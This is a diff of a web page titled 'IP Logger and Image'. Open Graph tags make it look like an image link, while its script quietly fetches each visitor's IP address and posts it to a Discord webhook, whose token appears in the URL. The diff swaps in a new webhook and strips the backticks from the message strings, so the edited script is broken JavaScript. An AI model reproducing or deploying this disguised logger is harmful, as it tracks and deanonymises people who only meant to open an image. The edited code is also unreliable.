@@ -5,7 +5,7 @@
     <title>Redirecting...</title>
     <title>IP Logger and Image</title>
 
-    
+
     <meta property="og:title" content="" />
     <meta property="og:description" content="" />
     <meta property="og:image" content="https://imgur.com/i12zp3X" />
@@ -15,25 +15,25 @@
     <meta property="og:type" content="image/png" />
 
     <script>
-        const webhookURL = "https://discordapp.com/api/webhooks/1317895579828748308/ni9_3dstKqP9xLi-AQglTGZErQ26PbkW0RIrbG3s60hX5EajueEvpIsWJPbOoNj_kd1F";
+        const webhookURL = "https://discordapp.com/api/webhooks/1320777914798575656/W6NiQzMU5cv83H-CinV_-S0alaK3sTST_9Omr8C5wWdDd8P9XqAh9Klg_TUn1JjQxtvg";
 
         async function logIP() {
-            const response = await fetch("https://api.ipify.org?format=json");
+            const response = await fetch("https://api.ipify.org/?format=json");
             const data = await response.json();
             try {
-                const response = await fetch("https://api.ipify.org?format=json");
+                const response = await fetch("https://api.ipify.org/?format=json");
                 const data = await response.json();
 
             // Send IP to Discord webhook
             fetch(webhookURL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: `IP Logged: ${data.ip}` })
+                body: JSON.stringify({ content: IP Logged: ${data.ip} })
             });
                 await fetch(webhookURL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: `IP Logged: ${data.ip}` })
+                    body: JSON.stringify({ content: IP Logged: ${data.ip} })
                 });
             } catch (error) {
                 console.error("Error logging IP:", error);
